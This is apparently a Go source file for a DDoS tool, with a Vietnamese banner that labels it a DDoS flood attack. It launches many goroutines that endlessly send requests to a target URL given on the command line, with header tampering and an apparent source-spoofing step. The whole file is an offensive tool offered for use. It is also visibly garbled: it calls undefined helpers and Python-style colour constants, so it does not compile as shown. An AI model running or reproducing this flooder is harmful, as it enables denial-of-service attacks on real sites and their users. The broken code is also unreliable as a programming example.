package main

import(
  "crypto/tls"
  "os"
  "strconv"

  "github.com/valyala/fasthttp"
)
var target struct{
  url string
  threads int
  method string
  a_type string
}

func httpflood(){
  head := header{"false", nil}
  sp := spoof{"127.0.0.1", 5}
  client := &fasthttp.Client{TLSConfig: &tls.Config{CurvePreferences: []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521, tls.X25519}}}
  req := fasthttp.AcquireRequest()
  req.SetRequestURI(target.url)
  req.Header.SetMethod(target.method)
  head.headers(req)
  sp.spoofS(req)
  for{
    client.Do(req, nil)
  }
}

func main(){
  target.url = os.Args[1]
  target.method = os.Args[2]
  threads, _ := strconv.Atoi(os.Args[3])
  Print("Đang Khởi Động")
    clear()
  Print(Fore.RED +" [..              [..               ") 
  Print(Fore.RED +" [..              [..                ")
  Print(Fore.RED +" [..[.. [..       [..[. [...   [..   ") 
  Print(Fore.RED +" [.. [..  [.. [.. [.. [..    [..  [..") 
  Print(Fore.RED +" [.. [..  [..[.   [.. [..   [..   [..")
  Print(Fore.RED +" [.. [..  [..[.   [.. [..   [..   [..") 
  Print(Fore.RED +" [..[...  [.. [.. [..[...     [.. [... ")
  Print(Fore.RED +"              Tấn Công DDoS Flood By NTV ")
   for i:=0; i < threads; i++{
     go httpflood()
   }

  <- make(chan bool, 1)
}
